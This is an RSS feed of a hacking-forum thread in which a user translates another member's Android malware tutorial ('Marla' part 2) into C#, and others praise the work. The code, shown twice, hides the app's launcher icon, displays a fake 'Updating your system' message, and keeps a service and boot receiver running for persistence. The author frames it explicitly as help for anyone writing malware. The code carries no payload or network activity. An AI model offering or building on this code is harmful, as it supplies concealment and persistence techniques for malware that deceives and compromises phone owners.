<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Android Malware: A Tumor called Marla 0x02 [C#]</title>
    <link>https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859</link>
    <description>Hey mates,
again I translate @L3akM3-0day&#39;s code into C#. See the original article [here](https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02/851) :wink:.

---
## Hiding App Icon
### Main activity
```
using System;
using Android.App;
using Android.Content;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using Android.OS;

using Android.Content.PM;

namespace Marla
{
    [Activity(Label = &quot;Marla&quot;, MainLauncher = true, Icon = &quot;@drawable/icon&quot;)]
    public class MainActivity : Activity
    {
        protected override void OnCreate(Bundle bundle)
        {
            base.OnCreate(bundle);

            // The App-hiding line ;)
            PackageManager.SetComponentEnabledSetting(base.ComponentName, ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);

            // The Toast
            Toast.MakeText(this, &quot;Updating your system please wait ...&quot;, ToastLength.Long);

        }
    }
}
```
### The Service
```
using System;
using Android.App;
using Android.Content;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using Android.OS;

namespace Marla
{
    [Service]
    public class MainService : Service
    {
        public override StartCommandResult OnStartCommand(Android.Content.Intent intent, StartCommandFlags flags, int startId)
        {
            // Show Toast in UI Thread
            Application.SynchronizationContext.Post(_ =&gt; { Toast.MakeText(Android.App.Application.Context, &quot;Malware Started!&quot;, ToastLength.Long).Show(); }, null);

            // Restart Service after being closed due to low memory
            return StartCommandResult.Sticky;
        }

        public override IBinder OnBind(Intent intent)
        {
            // We don&#39;t need any bindings -&gt; Return null
            return null;
        }
    }
}
```
### BroadcastReceiver
The same as last time :wink:
```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;

namespace Marla
{
    /// &lt;summary&gt;
    /// Waits for Boot to start the MainActivity
    /// &lt;/summary&gt;
    [BroadcastReceiver]
    [IntentFilter(new[] { Intent.ActionBootCompleted })]
    partial class BootReceiver : BroadcastReceiver
    {
        public override void OnReceive(Context context, Intent intent)
        {
            if (intent.Action == Intent.ActionBootCompleted)
            {         
                context.StartActivity(typeof(MainActivity));
            }
        }
    }
}
```
## Conclusion
A very light post about @L3akM3-0day&#39;s malware translated into C#. Maybe this helps someone, who wants to write his malware in another language than (At least hated by me) Java :smile:.

|-TheDoctor-|</description>
    
    <lastBuildDate>Tue, 02 Aug 2016 02:12:10 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Android Malware: A Tumor called Marla 0x02 [C#]</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859/6</link>
        <pubDate>Sun, 21 Jan 2018 00:42:20 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-859-6</guid>
        <source url="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859.rss">Android Malware: A Tumor called Marla 0x02 [C#]</source>
      </item>
      <item>
        <title>Android Malware: A Tumor called Marla 0x02 [C#]</title>
        <dc:creator><![CDATA[Cromical]]></dc:creator>
        <description><![CDATA[
            <p>Neato-o mate! Nice code! Translated it great too! <a class="mention" href="https://0x00sec.org/u/l3akm3-0day">@L3akM3-0day</a> did a great job with the original, and so did you with the C# version.</p>
          <p><a href="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859/5</link>
        <pubDate>Tue, 02 Aug 2016 02:12:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-859-5</guid>
        <source url="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859.rss">Android Malware: A Tumor called Marla 0x02 [C#]</source>
      </item>
      <item>
        <title>Android Malware: A Tumor called Marla 0x02 [C#]</title>
        <dc:creator><![CDATA[L3akM3-0day]]></dc:creator>
        <description><![CDATA[
            <p>No problem <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> Hacking is sharing knowledge</p>
          <p><a href="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859/4</link>
        <pubDate>Sat, 30 Jul 2016 18:09:33 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-859-4</guid>
        <source url="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859.rss">Android Malware: A Tumor called Marla 0x02 [C#]</source>
      </item>
      <item>
        <title>Android Malware: A Tumor called Marla 0x02 [C#]</title>
        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
        <description><![CDATA[
            <p>I learn some stuff when I translate, e.g. the icon hiding thing could be useful for Argus <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">, so I have to thank you for the original articles <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">.</p>
          <p><a href="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859/3</link>
        <pubDate>Sat, 30 Jul 2016 18:03:16 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-859-3</guid>
        <source url="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859.rss">Android Malware: A Tumor called Marla 0x02 [C#]</source>
      </item>
      <item>
        <title>Android Malware: A Tumor called Marla 0x02 [C#]</title>
        <dc:creator><![CDATA[L3akM3-0day]]></dc:creator>
        <description><![CDATA[
            <p>Nice <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> This is cool that you translate my code <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
          <p><a href="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859/2</link>
        <pubDate>Sat, 30 Jul 2016 17:51:27 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-859-2</guid>
        <source url="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859.rss">Android Malware: A Tumor called Marla 0x02 [C#]</source>
      </item>
      <item>
        <title>Android Malware: A Tumor called Marla 0x02 [C#]</title>
        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
        <description><![CDATA[
            <p>Hey mates,<br>
again I translate <a class="mention" href="https://0x00sec.org/u/l3akm3-0day">@L3akM3-0day</a>â€™s code into C#. See the original article <a href="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02/851">here</a> <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.</p>
<hr>
<h2>Hiding App Icon</h2>
<h3>Main activity</h3>
<pre><code class="lang-auto">using System;
using Android.App;
using Android.Content;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using Android.OS;

using Android.Content.PM;

namespace Marla
{
    [Activity(Label = "Marla", MainLauncher = true, Icon = "@drawable/icon")]
    public class MainActivity : Activity
    {
        protected override void OnCreate(Bundle bundle)
        {
            base.OnCreate(bundle);

            // The App-hiding line ;)
            PackageManager.SetComponentEnabledSetting(base.ComponentName, ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);

            // The Toast
            Toast.MakeText(this, "Updating your system please wait ...", ToastLength.Long);

        }
    }
}
</code></pre>
<h3>The Service</h3>
<pre><code class="lang-auto">using System;
using Android.App;
using Android.Content;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using Android.OS;

namespace Marla
{
    [Service]
    public class MainService : Service
    {
        public override StartCommandResult OnStartCommand(Android.Content.Intent intent, StartCommandFlags flags, int startId)
        {
            // Show Toast in UI Thread
            Application.SynchronizationContext.Post(_ =&gt; { Toast.MakeText(Android.App.Application.Context, "Malware Started!", ToastLength.Long).Show(); }, null);

            // Restart Service after being closed due to low memory
            return StartCommandResult.Sticky;
        }

        public override IBinder OnBind(Intent intent)
        {
            // We don't need any bindings -&gt; Return null
            return null;
        }
    }
}
</code></pre>
<h3>BroadcastReceiver</h3>
<p>The same as last time <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
<pre><code class="lang-auto">using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;

namespace Marla
{
    /// &lt;summary&gt;
    /// Waits for Boot to start the MainActivity
    /// &lt;/summary&gt;
    [BroadcastReceiver]
    [IntentFilter(new[] { Intent.ActionBootCompleted })]
    partial class BootReceiver : BroadcastReceiver
    {
        public override void OnReceive(Context context, Intent intent)
        {
            if (intent.Action == Intent.ActionBootCompleted)
            {         
                context.StartActivity(typeof(MainActivity));
            }
        }
    }
}
</code></pre>
<h2>Conclusion</h2>
<p>A very light post about <a class="mention" href="https://0x00sec.org/u/l3akm3-0day">@L3akM3-0day</a>â€™s malware translated into C#. Maybe this helps someone, who wants to write his malware in another language than (At least hated by me) Java <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">.</p>
<p>|-TheDoctor-|</p>
          <p><a href="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859/1</link>
        <pubDate>Sat, 30 Jul 2016 15:15:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-859-1</guid>
        <source url="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02-c/859.rss">Android Malware: A Tumor called Marla 0x02 [C#]</source>
      </item>
  </channel>
</rss>
